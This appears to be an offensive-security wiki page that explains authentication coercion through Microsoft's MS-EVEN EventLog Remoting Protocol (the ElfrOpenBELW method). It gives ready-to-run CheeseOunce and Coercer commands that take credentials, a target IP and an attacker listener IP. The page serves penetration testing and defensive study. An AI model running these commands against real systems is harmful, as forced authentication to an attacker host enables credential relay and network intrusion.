# MS-EVEN abuse (CheeseOunce)

## Theory

[MS-EVEN](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) is Microsoft's EventLog Remoting Protocol. It provides an RPC interface for reading events in both live and backup event logs on remote computers. That interface is available through `\PIPE\eventlog` SMB named pipe.

We can abuse this protocol to coerce authentications. Similarly to other MS-RPC abuses, this works by using a specific method relying on remote address. In this case, the `ElfrOpenBELW` method was detected vulnerable.

## Practice

{% tabs %}
{% tab title="Exploit" %}
#### CheeseOunce

The following Python proof-of-concept ([https://github.com/evilashz/CheeseOunce](https://github.com/evilashz/CheeseOunce)) implements the `ElfrOpenBELW` method.

```bash
python cheese.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP $ATTACKER_IP
```

#### Coercer

Another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.

```bash
coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-protocol-name MS-EVEN -l $ATTACKER_IP -t $TARGET_IP
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f" %}

{% embed url="https://github.com/evilashz/CheeseOunce" %}
